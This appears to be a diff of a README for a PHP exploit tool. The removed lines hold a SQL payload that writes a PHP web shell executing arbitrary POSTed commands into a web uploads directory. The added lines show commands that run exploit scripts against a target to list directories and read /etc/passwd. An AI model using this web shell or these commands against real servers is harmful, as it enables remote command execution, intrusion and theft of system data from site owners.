@@ -11,18 +11,10 @@
     <img src="https://img.shields.io/badge/php-5-green.svg">
 </p>
 
-1. SQL command `Query SQL` value
+1. exploit command `Query SQL` value
 ```
-SELECT '<?php
-if (isset($_POST["submit"])) {
-    $cmd = $_POST["cmd"];
-    echo "<pre>" . shell_exec($cmd) . "</pre>";
-}
-?>
-
-<form action="" method="post">
-    <input type="text" name="cmd" placeholder="Enter command" size="50" required>
-    <input type="submit" name="submit" value="Execute">
-</form>' INTO OUTFILE '/var/www/html/web/uploads/cmd.php'
-FIELDS TERMINATED BY '' LINES TERMINATED BY '';
+python3 cuk.py --target https://target/index.php
+python3 cek.py --target https://target/index.php --dir /var/www/html/
+python3 cek.py --target https://target/index.php --cat /etc/passwd 
+python3 cuk.py --target https://target/index.php
 ```
